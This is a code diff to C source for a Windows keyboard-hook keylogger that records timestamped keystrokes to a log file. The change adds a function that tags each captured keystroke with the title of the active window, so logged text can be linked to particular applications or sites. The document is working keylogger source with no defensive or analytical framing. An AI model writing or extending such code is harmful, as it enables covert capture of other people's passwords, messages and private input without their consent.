@@ -7,6 +7,18 @@ static HHOOK hHook;
 static FILE *logFile;
 static int shiftPressed = 0;
 
+char* GetActiveWindowTitle() {
+    static char title[256];
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd) {
+        GetWindowTextA(hwnd, title, sizeof(title));
+    } else {
+        strcpy(title, "[Unknown Window]");
+    }
+    return title;
+}
+
+
 char getCharFromVK(DWORD vkCode) {
     BYTE keyboardState[256];
     GetKeyboardState(keyboardState);
@@ -38,14 +50,14 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         if (logFile) {
             char ch = getCharFromVK(vkCode);
 
-            fprintf(logFile, "%s ", getTimestamp());
+            fprintf(logFile, "%s [%s] ", getTimestamp(), GetActiveWindowTitle());
 
             if (ch) {
                 fprintf(logFile, "%c\n", ch);
             } else {
                 char keyName[32];
                 UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
-                GetKeyNameText(scanCode << 16, keyName, sizeof(keyName));
+                GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName));
                 fprintf(logFile, "[%s]\n", keyName);
             }
 
